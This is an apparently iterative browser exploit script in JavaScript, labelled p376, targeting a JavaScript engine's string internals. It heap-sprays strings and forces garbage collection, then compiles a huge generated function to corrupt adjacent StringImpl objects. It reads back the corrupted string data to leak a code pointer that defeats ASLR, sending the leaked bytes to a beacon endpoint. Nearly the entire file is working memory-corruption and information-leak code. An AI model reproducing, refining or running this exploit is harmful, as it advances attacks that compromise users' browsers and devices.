// p376 - MetadataTable sweep: extract THUNK ADDRESS from StringImpl data
//
// V374 CONFIRMED: charCodeAt WORKS on corrupted strings! Returns original 'A' (0x41).
// This means m_data8 is intact. The sweep overwrites StringImpl::m_length (bytecodeIndex)
// but NOT m_data8. The thunk pointer at entry+24 writes INTO the character data region
// of adjacent StringImpl objects.
//
// Strategy:
// 1. Trigger corruption (proven bait-and-switch)
// 2. For each corrupted string, scan data for non-0x41 ('A') bytes
// 3. The sweep writes at entry+12 (0xFFFFFFFF), entry+24 (thunk, 8B), entry+64 (bits),
//    entry+68 (bytecodeIndex) within each 112-byte stride
// 4. The thunk is 8 consecutive bytes containing the LLInt slow path call address
// 5. Report the thunk bytes via beacon = ASLR leak
//
// Beacon prefix: V376-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V376-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V376-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var strings = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V376-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }

    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strings.push(s);
        }
        beacon('STRINGS-' + strings.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // Find corrupted strings
        var corrupted = [];
        for (var i = 0; i < strings.length; i++) {
          try {
            if (strings[i].length !== STR_LEN) corrupted.push(i);
          } catch(e) {}
        }
        beacon('CORRUPT-' + corrupted.length);
        if (corrupted.length === 0) { beacon('NOCORRUPT'); beacon('DONE'); self.postMessage({done:true}); return; }

        var cLen = strings[corrupted[0]].length;
        beacon('CLEN-' + cLen);

        // Phase 1: Scan first 3 corrupted strings for non-0x41 bytes
        // We read in chunks and report positions of non-canary bytes
        var SCAN_MAX = Math.min(cLen, 1000);

        for (var si = 0; si < Math.min(corrupted.length, 3); si++) {
          var idx = corrupted[si];
          var s = strings[idx];
          var firstNon = -1;

          // Scan first 1000 chars for non-'A' bytes
          for (var pos = 0; pos < SCAN_MAX; pos++) {
            try {
              var cc = s.charCodeAt(pos);
              if (cc !== CANARY) {
                if (firstNon < 0) {
                  firstNon = pos;
                  beacon('S' + si + '-FIRST-' + pos);
                }
                // Read a 16-byte window around this position
                var hex = '';
                var start = Math.max(0, pos - 4);
                for (var h = start; h < Math.min(start + 24, SCAN_MAX); h++) {
                  try {
                    var v = s.charCodeAt(h);
                    hex += hexByte(v & 0xFF);
                    if (v > 255) hex += hexByte((v >> 8) & 0xFF);
                  } catch(ex) { hex += 'XX'; }
                }
                beacon('S' + si + '-AT' + pos + '-' + hex.substring(0, 80));
                // Skip to end of this non-canary region
                while (pos + 1 < SCAN_MAX) {
                  try {
                    if (s.charCodeAt(pos + 1) === CANARY) break;
                  } catch(ex) { break; }
                  pos++;
                }
              }
            } catch(ex) { break; }
          }
          if (firstNon < 0) beacon('S' + si + '-ALL-A');
        }

        // Phase 2: If we found non-canary data, read 112 bytes starting from firstNon
        // to capture a full entry pattern
        for (var si = 0; si < Math.min(corrupted.length, 2); si++) {
          var idx = corrupted[si];
          var s = strings[idx];
          // Find first non-A
          var entryStart = -1;
          for (var pos = 0; pos < SCAN_MAX; pos++) {
            try {
              if (s.charCodeAt(pos) !== CANARY) { entryStart = pos; break; }
            } catch(ex) { break; }
          }
          if (entryStart < 0) continue;

          // Align to start of the 112-byte pattern
          // The first non-A byte is at some offset within the entry
          // Read 224 bytes (2 full entries) starting from entryStart - 16
          var readStart = Math.max(0, entryStart - 16);
          var readEnd = Math.min(readStart + 224, cLen);

          var hex1 = '';
          var hex2 = '';
          var hex3 = '';
          for (var h = readStart; h < readEnd; h++) {
            try {
              var v = s.charCodeAt(h);
              var hx = hexByte(v & 0xFF);
              if (v > 255) hx += hexByte((v >> 8) & 0xFF);
              if (h - readStart < 80) hex1 += hx;
              else if (h - readStart < 160) hex2 += hx;
              else hex3 += hx;
            } catch(ex) { hex3 += 'XX'; }
          }
          beacon('ENTRY' + si + '-off' + readStart + '-' + hex1);
          if (hex2.length > 0) beacon('ENTRY' + si + 'B-' + hex2);
          if (hex3.length > 0) beacon('ENTRY' + si + 'C-' + hex3);
        }

        // Phase 3: Specifically check 8 bytes at positions that could be the thunk
        // The sweep pattern has thunk at entry+24 within each 112-byte stride
        // Try reading at regular 112-byte intervals starting from different offsets
        beacon('THUNK-HUNT');
        for (var si = 0; si < Math.min(corrupted.length, 3); si++) {
          var idx = corrupted[si];
          var s = strings[idx];

          // Try reading 8 bytes at various positions in the expected pattern
          // Look for 8 consecutive non-0x41 bytes that form a pointer-like value
          for (var base = 0; base < Math.min(cLen, 2000); base += 112) {
            // Check position base+24 through base+31 (expected thunk position)
            var allA = true;
            for (var b = base + 24; b < base + 32 && b < cLen; b++) {
              try {
                if (s.charCodeAt(b) !== CANARY) { allA = false; break; }
              } catch(ex) { allA = false; break; }
            }
            if (!allA) {
              // Found non-A bytes at the expected thunk position!
              var hex = '';
              for (var b = base + 24; b < base + 32 && b < cLen; b++) {
                try {
                  var v = s.charCodeAt(b);
                  hex += hexByte(v & 0xFF);
                  if (v > 255) hex += hexByte((v >> 8) & 0xFF);
                } catch(ex) { hex += 'XX'; }
              }
              beacon('PTR-S' + si + '-off' + (base + 24) + '-' + hex);
            }

            // Also check base+12 through base+15 for 0xFFFFFFFF signature
            var isFF = true;
            for (var b = base + 12; b < base + 16 && b < cLen; b++) {
              try {
                if (s.charCodeAt(b) !== 0xFF) { isFF = false; break; }
              } catch(ex) { isFF = false; break; }
            }
            if (isFF && base + 12 < cLen) {
              beacon('FF-S' + si + '-off' + (base + 12));
            }
          }
        }

        // Phase 4: Quick scan of string[0] at every 4th byte for non-A (faster sweep detection)
        beacon('QSCAN');
        var s0 = strings[corrupted[0]];
        var qhits = 0;
        for (var pos = 0; pos < Math.min(cLen, 5000) && qhits < 30; pos += 4) {
          try {
            if (s0.charCodeAt(pos) !== CANARY) {
              // Read 8 bytes at this position
              var hex = '';
              for (var b = pos; b < pos + 8 && b < cLen; b++) {
                try {
                  var v = s0.charCodeAt(b);
                  hex += hexByte(v & 0xFF);
                  if (v > 255) hex += hexByte((v >> 8) & 0xFF);
                } catch(ex) { hex += 'XX'; }
              }
              beacon('Q-' + pos + '-' + hex);
              qhits++;
            }
          } catch(ex) { break; }
        }
        beacon('QHITS-' + qhits);

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < 20; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + baits.length);

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p376fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p376ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p376ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
